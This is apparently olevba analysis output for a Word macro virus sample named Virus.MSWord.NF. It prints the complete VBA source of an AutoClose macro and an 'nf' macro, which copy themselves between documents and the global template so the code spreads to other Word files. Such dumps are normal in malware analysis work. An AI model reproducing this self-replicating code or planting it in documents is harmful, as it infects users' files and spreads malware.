olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.NF-a31eadbc715acf66deffd5e968a4ab827536f465
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.NF-a31eadbc715acf66deffd5e968a4ab827536f465 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO aUtoCLOse.bas 
in file: Virus.MSWord.NF-a31eadbc715acf66deffd5e968a4ab827536f465 - OLE stream: 'Macros/VBA/aUtoCLOse'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Dim n
Dim i
n = WordBasic.CountMacros(0)
For i = 1 To n
If WordBasic.[MacroName$](i, 0) = "nf" Then
GoTo e
End If
Next
WordBasic.MacroCopy WordBasic.[FileName$]() + ":aUtoCLOse", "global:nf", 1
WordBasic.MacroCopy WordBasic.[FileName$]() + ":nf", "global:aUtoCLOse", 1
WordBasic.PrintStatusBar "Infected!"
e:
End Sub
-------------------------------------------------------------------------------
VBA MACRO nf.bas 
in file: Virus.MSWord.NF-a31eadbc715acf66deffd5e968a4ab827536f465 - OLE stream: 'Macros/VBA/nf'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
WordBasic.MacroCopy "global:aUtoCLOse", WordBasic.[FileName$]() + ":nf", 1
WordBasic.MacroCopy "global:nf", WordBasic.[FileName$]() + ":aUtoCLOse", 1
WordBasic.FileSaveAs Name:=WordBasic.[FileName$](), Format:=1
WordBasic.PrintStatusBar "Traced!"
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |aUtoCLOse           |Runs when the Word document is closed        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

